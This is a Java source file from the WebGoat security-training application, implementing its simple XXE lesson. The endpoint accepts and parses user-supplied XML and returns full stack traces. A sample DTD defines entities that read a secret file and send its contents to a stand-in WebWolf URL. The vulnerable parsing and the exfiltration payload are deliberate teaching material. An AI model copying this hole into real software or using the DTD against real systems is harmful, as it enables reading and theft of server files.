/*
 * SPDX-FileCopyrightText: Copyright © 2014 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.lessons.xxe;

import static org.owasp.webgoat.container.assignments.AttackResultBuilder.failed;
import static org.springframework.http.MediaType.ALL_VALUE;
import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;

import org.apache.commons.lang3.exception.ExceptionUtils;
import org.owasp.webgoat.container.CurrentUser;
import org.owasp.webgoat.container.assignments.AssignmentEndpoint;
import org.owasp.webgoat.container.assignments.AssignmentHints;
import org.owasp.webgoat.container.assignments.AttackResult;
import org.owasp.webgoat.container.users.WebGoatUser;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({
  "xxe.hints.simple.xxe.1",
  "xxe.hints.simple.xxe.2",
  "xxe.hints.simple.xxe.3",
  "xxe.hints.simple.xxe.4",
  "xxe.hints.simple.xxe.5",
  "xxe.hints.simple.xxe.6"
})
public class SimpleXXE implements AssignmentEndpoint {

  private final CommentsCache comments;

  public SimpleXXE(CommentsCache comments) {
    this.comments = comments;
  }

  @PostMapping(path = "xxe/simple", consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)
  @ResponseBody
  public AttackResult createNewComment(
      @RequestBody String commentStr, @CurrentUser WebGoatUser user) {
    String error = "";
    try {
      var comment = comments.parseXml(commentStr);
      comments.addComment(comment, user, false);
    } catch (Exception e) {
      error = ExceptionUtils.getStackTrace(e);
    }
    return failed(this).output(error).build();
  }

  @RequestMapping(
      path = "/xxe/sampledtd",
      consumes = ALL_VALUE,
      produces = MediaType.TEXT_PLAIN_VALUE)
  @ResponseBody
  public String getSampleDTDFile() {
    return """
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:replace-this-by-webgoat-temp-directory/XXE/secret.txt">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>">
%all;
""";
  }
}
